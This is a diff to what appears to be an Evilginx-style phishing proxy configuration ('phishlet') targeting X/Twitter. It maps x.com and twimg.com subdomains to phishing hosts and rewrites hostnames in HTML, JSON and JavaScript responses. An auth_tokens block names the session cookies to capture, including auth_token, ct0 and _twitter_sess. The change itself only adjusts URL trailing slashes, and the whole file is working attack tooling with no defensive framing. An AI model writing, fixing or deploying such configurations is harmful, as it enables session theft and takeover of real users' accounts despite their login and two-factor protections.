@@ -8,15 +8,15 @@ proxy_hosts:
   - {phish_sub: "abs", orig_sub: "abs", domain: "twimg.com", session: false, is_landing: false}
   - {phish_sub: "abs-0", orig_sub: "abs-0", domain: "twimg.com", session: false, is_landing: false}
 sub_filters:
-  - {triggers_on: "x.com", orig_sub: "x", domain: "com", search: "https://{hostname}/", replace: "https://{hostname}/", mimes: ["text/html", "application/json", "application/javascript"]}
-  - {triggers_on: "x.com", orig_sub: "www", domain: "x.com", search: "https://{hostname}/", replace: "https://{hostname}/", mimes: ["text/html", "application/json"]}
-  - {triggers_on: "x.com", orig_sub: "api", domain: "x.com", search: "https://{hostname}/", replace: "https://{hostname}/", mimes: ["text/html", "application/json"]}
-  - {triggers_on: "x.com", orig_sub: "abs", domain: "twimg.com", search: "https://{hostname}/", replace: "https://{hostname}/", mimes: ["text/html", "application/json", "application/javascript"]}
-  - {triggers_on: "x.com", orig_sub: "abs-0", domain: "twimg.com", search: "https://{hostname}/", replace: "https://{hostname}/", mimes: ["text/html", "application/json", "application/javascript"]}
-  - {triggers_on: "x.com", orig_sub: "api", domain: "twitter.com", search: "https://{hostname}/", replace: "https://{hostname}/", mimes: ["text/html", "application/json", "application/javascript"]}
-  - {triggers_on: "x.com", orig_sub: "ton", domain: "twimg.com", search: "https://{hostname}/", replace: "https://{hostname}/", mimes: ["text/html", "application/json", "application/javascript"]}
-  - {triggers_on: "x.com", orig_sub: "pbs", domain: "twimg.com", search: "https://{hostname}/", replace: "https://{hostname}/", mimes: ["text/html", "application/json", "application/javascript"]}
-  - {triggers_on: "x.com", orig_sub: "video", domain: "twimg.com", search: "https://{hostname}/", replace: "https://{hostname}/", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "x.com", orig_sub: "x", domain: "com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "x.com", orig_sub: "www", domain: "x.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json"]}
+  - {triggers_on: "x.com", orig_sub: "api", domain: "x.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json"]}
+  - {triggers_on: "x.com", orig_sub: "abs", domain: "twimg.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "x.com", orig_sub: "abs-0", domain: "twimg.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "x.com", orig_sub: "api", domain: "twitter.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "x.com", orig_sub: "ton", domain: "twimg.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "x.com", orig_sub: "pbs", domain: "twimg.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "x.com", orig_sub: "video", domain: "twimg.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"]}
 auth_tokens:
   - domain: ".twitter.com"
     keys: ["auth_token", "ct0", "_twitter_sess", "guest_id", "kdt"]
